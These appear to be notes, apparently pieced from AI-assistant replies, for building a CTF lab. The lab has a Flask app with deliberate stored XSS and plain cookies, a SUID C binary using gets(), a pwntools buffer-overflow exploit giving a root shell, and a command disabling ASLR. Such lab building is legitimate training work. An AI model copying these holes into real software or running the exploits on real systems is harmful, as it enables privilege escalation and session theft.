**Challenge**

### XXS-Vulnerable  Massaging App

---

## ✅ Final Project Structure

### 1. **`app.py` — The Flask backend**

- **Routes:**
    - `/` (GET): Shows the login page with the suggestion box. Passes the list `suggestions` to the template.
    - `/login` (POST): Validates username and password. If correct, sets a cookie named `session` with value `user=Samuel`, saves the cookie string to `cookie.txt`, and redirects to `/dashboard`. If invalid, returns 401 error.
    - `/suggest` (POST): Adds a submitted suggestion (user input) to the `suggestions` list and redirects back to `/`.
    - `/dashboard` (GET): Checks if the incoming request has a cookie `session=user=Samuel`. If yes, renders `dashboard.html` with the username; else, redirects to login page `/`.
- **Security Notes:**
    - The cookie here is just a plain string, not a Flask-signed session cookie.
    - The suggestion box **does not sanitize input**, making it vulnerable to stored XSS.
    - The cookie is saved to `cookie.txt` so the attacker bot can later read and try hijacking the session.
---

### 2. **`templates/index.html` — Login + Suggestion Box page**

- **Layout:**
    - Left side: Login form (`/login`) with username and password inputs.
    - Right side: Suggestion box form (`/suggest`) with a textarea to submit free-form text.
    - Below suggestion form: Displays the list of recent suggestions from the server.
- **Vulnerability:**
    - Suggestions are displayed with `{{ s|safe }}` — disables auto-escaping, so if someone submits HTML or JS (e.g., `<script>...</script>`), it will run in users’ browsers.
- **Styling:**
    - Uses Tailwind CSS for modern and responsive styling.
    - Custom styles for typing animation and glowing buttons.

---

### 3. **`templates/dashboard.html` — Chat Dashboard**

- **Layout:**
    - Sidebar with a list of “friends” (Hanna, Miki, Alex, CyberBot), each with an avatar and a short message.
    - Main chat area shows a Telegram-style conversation between Hanna and the logged-in user (`{{ username }}`).
    - Messages are styled with different background colors for Hanna (gray) and user (blue).
    - The input box is disabled (no sending functionality for now).
    - A logout button (not wired to any route yet).
- **Dynamic Content:**
    - User's avatar and name show using `{{ username }}`, which comes from the Flask backend.
- **Styling:**
    - Tailwind CSS plus some custom scrollbar styles.

---

## How They Work Together

- When a user visits `/`, they see the login page and suggestion box.
- They can submit suggestions which get added to the server list and shown to all users.
- Because suggestions render unsanitized, anyone can inject JavaScript to steal cookies.
- Logging in sets a simple cookie `session=user=Samuel`.
- Visiting `/dashboard` checks that cookie and shows the chat interface if valid.
- The attacker bot reads stolen cookies from a file and tries to use them to access `/dashboard`.

---

## What next?

We can:
- We can compile the code to Linux excutable, to find the username and password Reverse Engineer the code.
- Add the attacker bot code (`bot.py`) that reads stolen cookies and tries session hijacking.
- Implement the simple cookie receiver server to collect cookies from XSS payloads.
- Add logout route and connect logout button.
- Improve authentication (maybe Flask sessions instead of manual cookie).
- Add deployment/packaging steps with PyInstaller.

Let me know which part you want to do next or if you want me to explain any part deeper!

```
ctf-messaging-app/
├── app.py                  <-- Main Flask app (backend)
├── bot.py                  <-- Background auto-login bot
├── cookie.txt              <-- File where the session cookie will be stored
├── start-me.sh             <-- Optional launcher script for Linux
├── requirements.txt        <-- Python dependencies (Flask, requests)
├── templates/              <-- HTML files
│   ├── index.html          <-- Login page + suggestion box (XSS target)
│   └── dashboard.html      <-- Chat-style dashboard
└── static/                 <-- CSS and JS files
    ├── style.css           <-- Custom CSS styles
    └── script.js           <-- Optional frontend JS

```

---
## Messaging App 

### 🛠️ Now run these in your terminal:

```bash
mkdir -p ctf-messaging-app/templates
mkdir -p ctf-messaging-app/static
cd ctf-messaging-app

touch app.py bot.py cookie.txt start-me.sh requirements.txt
touch templates/index.html templates/dashboard.html
touch static/style.css static/script.js

```

Once you’ve created that structure

---

### ✅ Prompt for AI Website Builder Build me a clean and responsive login page for a CTF project.

> A centered login form with two fields:
> 

> Username input
> 
> 
> Password input
> 
> A Login button
> 
> On the right side of the page, there should be a suggestion box:
> 
> A textarea input for entering suggestions
> 
> A Submit button
> 
> Below the textarea, display submitted suggestions exactly as entered (no escaping)
> 
> Style everything with modern and clean CSS.
> Use plain HTML and CSS — no frameworks like Bootstrap.
> 
> Make the login form and suggestion box sit side-by-side using Flexbox.
> Add minimal styling (rounded corners, padding, light background).
> 

---
### The page layout should include:

### ✅ `templates/index.html` (Flask Version, XSS-ready)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CTF Challenge Login</title>
  <script src="<https://cdn.tailwindcss.com>"></script>
  <style>
    .glow-effect {
      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
    }
    .glow-effect:hover {
      box-shadow: 0 0 20px rgba(59, 130, 246, 0.7);
    }
    .typewriter {
      overflow: hidden;
      border-right: .15em solid #3b82f6;
      white-space: nowrap;
      margin: 0 auto;
      letter-spacing: .15em;
      animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite;
    }
    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }
    @keyframes blink-caret {
      from, to { border-color: transparent }
      50% { border-color: #3b82f6 }
    }
  </style>
</head>
<body class="bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-4">
  <div class="max-w-6xl w-full bg-gray-800 rounded-xl p-8 shadow-2xl">
    <h1 class="text-4xl font-bold text-center mb-2 text-blue-400">CTF Challenge Platform</h1>
    <p class="text-center text-gray-400 mb-8 typewriter">Unlock the secrets. Solve the puzzles.</p>

    <div class="flex flex-col md:flex-row gap-8">
      <!-- Login Form -->
      <div class="flex-1 bg-gray-700 p-6 rounded-lg">
        <h2 class="text-2xl font-semibold mb-6 text-blue-300">Login</h2>
        <form action="/login" method="POST" class="space-y-4">
          <div>
            <label for="username" class="block text-sm font-medium text-gray-300 mb-1">Username</label>
            <input type="text" id="username" name="username" required
              class="w-full px-4 py-2 bg-gray-600 border border-gray-500 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-white placeholder-gray-400"
              placeholder="Enter your username">
          </div>
          <div>
            <label for="password" class="block text-sm font-medium text-gray-300 mb-1">Password</label>
            <input type="password" id="password" name="password" required
              class="w-full px-4 py-2 bg-gray-600 border border-gray-500 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-white placeholder-gray-400"
              placeholder="Enter your password">
          </div>
          <button type="submit"
            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md transition duration-300 ease-in-out transform hover:scale-105 glow-effect">
            Login
          </button>
        </form>
        <div class="mt-4 text-center text-sm text-gray-400">
          <p>New to CTF? <a href="#" class="text-blue-400 hover:underline">Register here</a></p>
        </div>
      </div>

      <!-- Suggestion Box -->
      <div class="flex-1 bg-gray-700 p-6 rounded-lg">
        <h2 class="text-2xl font-semibold mb-6 text-blue-300">Suggestions</h2>
        <form action="/suggest" method="POST" class="space-y-4">
          <div>
            <label for="suggestion" class="block text-sm font-medium text-gray-300 mb-1">Your Suggestion</label>
            <textarea id="suggestion" name="suggestion" rows="4"
              class="w-full px-4 py-2 bg-gray-600 border border-gray-500 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-white placeholder-gray-400"
              placeholder="You can add anything here..."></textarea>
          </div>
          <button type="submit"
            class="w-full bg-green-600 hover:bg-green-700 text-white font-medium py-2 px-4 rounded-md transition duration-300 ease-in-out transform hover:scale-105 glow-effect">
            Submit Suggestion
          </button>
        </form>

        <div class="mt-6">
          <h3 class="text-lg font-medium text-gray-300 mb-2">Recent Suggestions</h3>
          <div class="space-y-3 max-h-48 overflow-y-auto pr-2">
            {% for s in suggestions %}
              <div class="bg-gray-600 p-3 rounded-md text-gray-200">{{ s|safe }}</div>
            {% endfor %}
          </div>
        </div>
      </div>
    </div>

    <div class="mt-8 text-center text-xs text-gray-500">
      <p>© 2025 CTF Challenge Platform. All rights reserved.</p>
    </div>
  </div>
</body>
</html>

```

---

### 🧠 Notes:

- The `suggestions` list is injected from Flask using `render_template()` — and the `|safe` filter is used to allow XSS for the CTF.
- The login and suggestion forms both now send data to Flask via `POST` (`/login` and `/suggest`).

---

### Let's now build the `app.py` file that:

1. Runs the Flask server on port `8080`
2. Hosts the `index.html` page
3. Accepts login (only **Samuel / samuel123@**)
4. Accepts suggestions and stores them
5. Shows suggestions on the index page
6. Stores the valid user's cookie into `cookie.txt`
7. Prepares everything for the XSS CTF (JavaScript injection will be tested in the suggestion box)

---

### ✅ `app.py`

```python
from flask import Flask, render_template, request, redirect, make_response
import os

app = Flask(__name__)
app.secret_key = 'ctf-super-secret'

# Store suggestions in memory for now
suggestions = []

# Hardcoded login credentials
VALID_USERNAME = 'Samuel'
VALID_PASSWORD = 'samuel123@'

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html', suggestions=suggestions)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if username == VALID_USERNAME and password == VALID_PASSWORD:
        resp = make_response(redirect('/dashboard'))
        # Set a fake session cookie for CTF testing
        cookie_value = 'user=' + username
        resp.set_cookie('session', cookie_value)

        # Save the cookie to a file (to be used by the bot later)
        with open('cookie.txt', 'w') as f:
            f.write(cookie_value)

        return resp
    else:
        return 'Invalid credentials. Try again.', 401

@app.route('/suggest', methods=['POST'])
def suggest():
    suggestion = request.form.get('suggestion')
    if suggestion:
        suggestions.append(suggestion)
    return redirect('/')

@app.route('/dashboard')
def dashboard():
    session_cookie = request.cookies.get('session')
    if session_cookie != f'user={VALID_USERNAME}':
        return redirect('/')
    return render_template('dashboard.html', username=VALID_USERNAME)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

```

---

### 🔐 Notes:

- You can test login with:
    - **Username:** `Samuel`
    - **Password:** `samuel123@`
- After login, a cookie named `session=user=Samuel` is set and saved in `cookie.txt`
- This is what your **XSS attack** will steal from the suggestion box

---


---

### ✅ `templates/dashboard.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dashboard - CTF Messaging</title>
  <script src="<https://cdn.tailwindcss.com>"></script>
</head>
<body class="bg-gray-900 text-gray-100 min-h-screen">
  <div class="flex h-screen">
    <!-- Sidebar (Friends list) -->
    <div class="w-1/4 bg-gray-800 p-4 border-r border-gray-700">
      <h2 class="text-xl font-bold text-blue-400 mb-4">Friends</h2>
      <ul class="space-y-3">
        <li class="bg-gray-700 p-2 rounded-md text-white">Hanna</li>
        <li class="bg-gray-700 p-2 rounded-md text-white">Miki</li>
        <li class="bg-gray-700 p-2 rounded-md text-white">Alex</li>
        <li class="bg-gray-700 p-2 rounded-md text-white">CyberBot</li>
      </ul>
    </div>

    <!-- Main Chat Area -->
    <div class="flex-1 flex flex-col">
      <div class="bg-gray-800 p-4 border-b border-gray-700">
        <h1 class="text-2xl font-bold text-blue-300">Welcome, {{ username }}</h1>
        <p class="text-sm text-gray-400">This is your secure messaging dashboard.</p>
      </div>

      <div class="flex-1 p-6 overflow-y-auto space-y-4 bg-gray-900">
        <!-- Static chat messages (for now) -->
        <div class="flex flex-col space-y-2">
          <div class="self-start bg-gray-700 text-white p-3 rounded-lg max-w-md">
            <strong>Hanna:</strong> Hey Samuel, are you joining the CTF today?
          </div>
          <div class="self-end bg-blue-600 text-white p-3 rounded-lg max-w-md">
            <strong>You:</strong> Yeah, I’m logging in right now.
          </div>
          <div class="self-start bg-gray-700 text-white p-3 rounded-lg max-w-md">
            <strong>Hanna:</strong> The first challenge has an XSS... careful!
          </div>
          <div class="self-end bg-blue-600 text-white p-3 rounded-lg max-w-md">
            <strong>You:</strong> 😏 Let’s see if they can steal my cookie.
          </div>
        </div>
      </div>

      <div class="p-4 border-t border-gray-700 bg-gray-800">
        <form class="flex gap-2">
          <input type="text" placeholder="Type a message..." class="flex-1 px-4 py-2 rounded-md bg-gray-700 text-white border border-gray-600 focus:outline-none" disabled>
          <button type="submit" class="bg-blue-500 px-4 py-2 rounded-md text-white cursor-not-allowed" disabled>Send</button>
        </form>
      </div>
    </div>
  </div>
</body>
</html>

```

---

### 💬 Notes:

- The **message form is disabled** for now (optional for CTF)
- Static messages simulate a real chat between Samuel and Hanna
- Feel free to customize messages to make the flag hunt more fun


---

## ✅ Compile It use `PyInstaller` with `-onefile` + `-add-data` To 

This will **compile everything into one binary** (`./ctf-messaging-app`) that works on any Linux machine.

---

### 🔧 Step-by-step: Compile everything into one `.exe`or style binary

### ✅ 1. Install PyInstaller

```bash
pip install pyinstaller

```

---

### ✅ 2. Build Command for PyInstaller

Run this from inside your `ctf-messaging-app/` folder:

```bash
pyinstaller app.py \\
  --onefile \\
  --name ctf-messaging-app \\
  --add-data "templates:templates" \\
  --add-data "static:static" \\
  --add-data "cookie.txt:." \\
  --add-data "bot.py:."

```

### ✅ Explanation:

| Flag | Description |
| --- | --- |
| `--onefile` | Bundle into a single executable |
| `--name` | Output binary will be named `ctf-messaging-app` |
| `--add-data` | Include folders/files like HTML and JS |

⚠️ **Important**: On Linux, use `:` for `--add-data`. On Windows, use `;`.

---

### ✅ 3. Run your compiled app:

After it builds, go to the output folder:

```bash
cd dist
./ctf-messaging-app

```

---

### ✅ 4. Make it like a native Linux app

Optionally move it:

```bash
sudo cp ctf-messaging-app /usr/local/bin/

```

Now you can run it from anywhere:

```bash
ctf-messaging-app

```
---

### ✅ Writeup

You're almost there! Want me to help with the `.spec` file or launcher script too?

- JavaScript-based **XSS vulnerability**
- Exploiting XSS reveals an encoded script containing FTP login information 🧠🔓📜

**Hints:**

- Access logs include suspicious query strings
- HTML comments and JavaScript variables hide encoded messages
- Fake scripts are placed to mislead players 📄🕵️‍♂️💥

**Lateral Movement:**

- Script is buried within multiple subdirectories
- Players must decode base64 or reversed JavaScript payloads
- Must manually explore folders such as `/opt/web/scripts/` 🔍🧩📂

**Tools Needed by Players:**

- Firefox/Chrome DevTools
- XSS payloads and manual inspection
- View-source analysis and basic JS decoding 🧰💡🖥️

---

# User 3: MIMI 🔐📁🧠

**Final Node**

**Initial Access:**

### ✅ **CTF Challenge Setup: SUID Buffer Overflow**

---

### 🔧 **Step 1: Vulnerable C Code (`vuln.c`)**

You've already provided a good code snippet. Here it is with minor improvements (e.g., compiler warnings):

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h> // For setuid/setgid

// Explicitly declare gets(), since it's removed from modern headers
char *gets(char *s);

void give_shell() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
}

void handle_input() {
    char buffer[64];

    printf("Enter your secret message: ");
    fflush(stdout);
    gets(buffer); // vulnerable: buffer overflow
    printf("You entered: %s\n", buffer);
}

int main() {
    printf("Welcome to the secure messaging system!\n");
    handle_input();
    printf("Exiting...\n");
    return 0;
}

```

---

### 🧪 **Step 2: Compile with Weak Security Settings**

Compile on a Linux machine with protections disabled:

```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie

```

| Flag | Purpose |
| --- | --- |
| `-fno-stack-protector` | Disables stack canaries |
| `-z execstack` | Makes the stack executable (optional for shellcode) |
| `-no-pie` | Disables PIE (static address space = easier exploit) |

---

### 🛡️ **Step 3: Set Ownership and Permissions**

```bash
sudo chown root:root vuln         # Must be owned by root
sudo chmod 4755 vuln              # Set SUID bit (4 = setuid, 755 = rwxr-xr-x)

```

**Verify:**

```bash
ls -l vuln
# -rwsr-xr-x 1 root root ... vuln

```

---

### 🏁 **Step 4: Place the Flag**

```bash
sudo mkdir -p /mimi
echo "FLAG{You_found_the_mimi_flag_and_escalated_privileges!}" | sudo tee /mimi/flag.txt > /dev/null
sudo chmod 400 /mimi/flag.txt
sudo chown root:root /mimi/flag.txt

```

---

### 📁 **Step 5: Deploy Binary in Challenge Directory**

```bash
sudo mkdir -p /opt/challenge
sudo mv vuln /opt/challenge/vuln
sudo chmod +x /opt/challenge/vuln

```

Make sure the user (e.g., `samuel`) has permission to execute:

```bash
sudo useradd -m samuel
sudo chown root:samuel /opt/challenge/vuln

```

---

### 💻 **Step 6: Test User Experience**

1. Switch to the test user:
    
    ```bash
    su - samuel
    
    ```
    
2. Run the binary:
    
    ```bash
    /opt/challenge/vuln
    
    ```
    
3. Use tools like:
    - `gdb /opt/challenge/vuln`
    - `objdump -d /opt/challenge/vuln`
    - `strings /opt/challenge/vuln`

---

### 🎯 **The Exploit (Player Perspective)**

### Exploit Plan:

1. **Find the address of `give_shell`:**
    
    ```bash
    objdump -d /opt/challenge/vuln | grep give_shell
    
    ```
    
2. **Calculate the offset to return address:**
    
    Use `gdb` or pattern tools. For this binary, it's typically `72–76` bytes.
    
    Example with `gdb`:
    
    ```
    gdb /opt/challenge/vuln
    (gdb) disas handle_input
    (gdb) run
    
    ```
    
3. **Exploit Payload:**
    
    ```bash
    python3 -c "print('A'*76 + '\\xNN\\xNN\\xNN\\xNN')" | /opt/challenge/vuln
    
    ```
    
    Replace `\\xNN...` with the little-endian address of `give_shell()`.
    
4. **Boom! Root shell.**

---

### 🧼 **Extra Tips for Realism or Hardening:**

- **Disable ASLR** (temporarily for consistent behavior):
    
    ```bash
    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    
    ```
    
- **Use `readelf -s vuln`** to find symbols if `objdump` doesn’t help.
- **Use `gdb-peda`** or `pwndbg` to assist exploitation (optional but helpful).
- Place binary in `~/opt/` to simulate a more realistic environment.
- Add hints like `README.txt` or hidden `.notes` to guide players subtly.

---

### 🏁 Final Test: Checklist

| Checkpoint | Status |
| --- | --- |
| SUID binary is correctly set | ✅ |
| Buffer overflow exists | ✅ |
| ASLR is disabled (optional) | ✅ |
| `give_shell()` is present and reachable | ✅ |
| Flag is root-readable only | ✅ |
| User `samuel` can run the binary | ✅ |
| Binary is non-PIE and exploitable | ✅ |

---

Would you like a pre-made Docker container or VM template of this challenge as well? I can help package this into a ready-to-go CTF setup.

You're running into **expected behavior** for a restricted user (`samuel`) on a Linux system:

---

### 🧱 Problem Summary

1. **`gdb` is not installed**, and the system suggests installing it with `apt install gdb`.
2. **`samuel` is not root**, so `apt` cannot be used to install packages.
3. **You're typing GDB commands (`disas`, `run`) directly in the shell**, not within GDB (this causes the "syntax error near unexpected token" error).

---

### ✅ How to Fix and Proceed

### 🔹 Option 1: **Ask the admin (you?) to install `gdb`**

If you control the machine (or are setting up the CTF):

```bash
sudo apt update
sudo apt install gdb

```

Then `samuel` can run:

```bash
gdb /opt/challenge/vuln

```

### 🔹 Option 2: **Use `objdump` (already installed)**

If you can't install GDB, you can still analyze the binary using `objdump`, which is usually pre-installed:

```bash
objdump -d /opt/challenge/vuln | less

```

To find the address of the `give_shell` function:

```bash
objdump -d /opt/challenge/vuln | grep give_shell

```

Example output:

```
080484b6 <give_shell>:

```

That `080484b6` is the address you want to jump to (you’ll reverse it for your exploit: `\xb6\x84\x04\x08`).

### 🔹 Option 3: **Use `readelf` (also likely installed)**

```bash
readelf -s /opt/challenge/vuln | grep give_shell

```

---

### 🧠 Reminder: How to Use GDB Correctly (When It's Installed)

You don't type `disas` or `run` in the shell directly. You first enter `gdb`, then run commands inside its prompt:

```bash
samuel@bunna:~$ gdb /opt/challenge/vuln
(gdb) disassemble handle_input
(gdb) run

```

---

### 🚀 Next Steps (If GDB is not an option)

Just proceed with static analysis using `objdump`:

1. Find the address of `give_shell()`.
2. Build the exploit payload with the correct offset (usually 76 bytes of padding, then the address in little-endian).
3. Pipe the payload:

```bash
python3 -c "print('A'*76 + '\xb6\x84\x04\x08')" | /opt/challenge/vuln

```

*(Replace the address bytes with the actual ones you find.)*

---

Let me know if you'd like help **generating the payload dynamically**, **automating the exploit**, or **verifying the offset with a pattern**!

Great, neo! You've shared the source code of the vulnerable program. Since it uses `gets()` and contains a `give_shell()` function, we can exploit it using a **buffer overflow** to **overwrite the return address with the address of `give_shell()`**, giving us a root shell.

---

## 🧨 Final Exploit Script (All-in-One)

Below is a **complete Python exploit** using `pwntools` that:

1. Finds the correct offset,
2. Leaks the address of `give_shell()` from the binary,
3. Constructs the payload to overflow and redirect execution to `give_shell()`.

---

### ✅ Exploit Script: `exploit.py`

```python
from pwn import *

# Load binary
elf = ELF("/opt/challenge/vuln")

# Start process
p = process(elf.path)

# Step 1: Offset found from pattern (64 bytes buffer + 8 bytes saved RBP)
offset = 72

# Step 2: Get the address of give_shell
give_shell = elf.symbols['give_shell']
log.success(f"give_shell() is at {hex(give_shell)}")

# Step 3: Build the payload
payload = b"A" * offset + p64(give_shell)

# Step 4: Send payload
p.recvuntil(b"Enter your secret message: ")
p.sendline(payload)

# Step 5: Get shell
p.interactive()

```

---

### ⚙️ How to Run It

1. **Install pwntools** (if not already):

```bash
pip install pwntools

```

1. **Run the exploit**:

```bash
python3 exploit.py

```

---

### 🎯 Result

You will get:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root)

```

🎉 **Root shell successfully spawned!**

---

### 🧠 Bonus — How You Got 72 Bytes:

- 64 bytes = buffer
- 8 bytes = saved RBP
- Then the next 8 = return address (we overwrite it with `give_shell()`)

---

- Triggered by a script from Samuel’s challenge
- SSH credentials discovered allow access to Mingmi’s account 🔑🧳🌐

**Challenge:**

- **Privilege escalation** via misconfigured `sudo` rule (e.g., `nano` or `less` allowed as root) 🧱📈🔧

**Flags:**

- User flag located in Mimi’s home directory
- Root flag located in `/root/`

**Story Element:**

- Journal in Mingmi’s home directory reads:
    
    > "I was trusted once... they never noticed I left my powers in plain sight."
    > 
- A hidden key is embedded in `.bash_history` or `.viminfo`
- This key acts as both an access credential and a symbolic conclusion to the CTF 📖🗝️🏁

**Hints:**

- `sudo -l` reveals vulnerable commands
- Legacy configuration backups in `/home/mingmi/old_config/` have loose permissions
- Several decoy password files present 🗂️👀🧪

**Tools Needed by Players:**

- `sudo -l`
- Knowledge of privilege escalation techniques using `nano`, `less`, or `find`
- Manual exploitation methods only (no automation scripts) 🧰🔧🎯

---

# Export VM from VirtualBox

## 🔧 Step-by-Step: Export VM from VirtualBox to TryHackMe

---

## ✅ Step 1: Clean Up the VM

Before exporting:

1. **Start the VM**
2. Remove personal data (if any)
3. Run:
    
    ```bash
    sudo apt clean
    sudo rm -rf /tmp/*
    history -c
    
    ```
    
4. Shut down the VM completely (not pause).

---

## ✅ Step 2: Export the VM as `.ova`

1. Open **VirtualBox**
2. Click on your VM to select it
3. Go to **File > Export Appliance**

---

### ✅ VirtualBox "Export Virtual Appliance" – What to Choose

You’ll see a window with several options:

---

### 🔹 **Format**

> Open Virtualization Format 1.0
> 

✅ **Leave it as it is** — this is the correct format TryHackMe accepts.

Don't select "Oracle Cloud Infrastructure."

Stick with **Open Virtualization Format 1.0**.

---

### 🔹 **File:**

> Example: /home/neo/Documents/bunna server.ova
> 

✅ This is the name and location of the `.ova` file that will be created.

🟡 **IMPORTANT**:

- **Must end in `.ova`**
- No special characters in the filename (✅ bunna_server.ova, ❌ bunna server🔥.ova)
- You can click the folder icon to choose a **safe folder**

📌 You can rename it to something like:

```
/home/neo/Documents/bunna_server.ova

```

---

### 🔹 **MAC Address Policy**

You’ll see:

- `Include only NAT network adapter MAC addresses` ✅ (recommended)
- `Include all network adapter MAC addresses`
- `Generate new MAC addresses for all network adapters`

✅ **Choose:**

```
Include only NAT network adapter MAC addresses

```

This prevents issues when uploading to TryHackMe.

---

### 🔹 **Additionally:**

Here you have two checkboxes:

1. ✅ **Write Manifest file**
    - ✔️ Keep this checked — it helps verify the integrity of your `.ova`
2. ❌ **Include ISO image files**
    - ❌ **UNcheck this** — you don’t want to include the ISO, it will make the `.ova` very large and not needed by TryHackMe

---

### ✅ Final Summary — Settings You Should Use

| Option | What to Select |
| --- | --- |
| Format | Open Virtualization Format 1.0 |
| File | `/home/neo/Documents/bunna_server.ova` |
| MAC Address Policy | Include only NAT network adapter MAC addresses |
| Write Manifest File | ✅ Yes (checked) |
| Include ISO image files | ❌ No (unchecked) |

---

### ✅ After that:

Click **Next →** and then **Export**

✅ Wait while it creates the `.ova` file — it may take a few minutes depending on size.

Once you have `bunna_server.ova`, you're ready to upload it to TryHackMe! 🎯

---

Do you want me to help you **test** the VM on TryHackMe or build a **flag system inside it** like `/flag.txt`?

💡 **Result**: You will get a file like `myvm.ova`

---

## ✅ Step 3: Compress the `.ova` (Optional)

TryHackMe accepts `.ova`, but to make upload faster:

You can compress the `.ova` using ZIP:

```bash
zip myvm.zip myvm.ova

```

---

## ✅ Step 4: Upload to TryHackMe

Now let’s go to TryHackMe:

1. Go to [https://tryhackme.com](https://tryhackme.com/)
2. Click your profile > Go to **"Create Room"**
3. Click **"Machines" tab**
4. Click **"Add Virtual Machine"**
5. Fill:
    - **VM Name**: (e.g., `buna-ctf-vm`)
    - **Base Image**: Choose `Ubuntu` or `Custom`
    - **Upload OVA File**: Upload your `.ova` 
    - Description: Write what the VM is for (CTF, challenge, etc.)
6. Click **Upload**

📢 Wait a few minutes — TryHackMe will scan and prepare your machine.

---

## ✅ Step 5: Connect and Test

Once uploaded:

1. You’ll see it listed in your room
2. Launch it from **your room preview**
3. Connect via **TryHackMe web shell** or **your own OpenVPN** and test everything works!

---

## 🧠 Tips

- Don’t use passwords like `1234`, make it secure.
- Remove unnecessary tools.
- Set a **static IP** if your challenge depends on it.
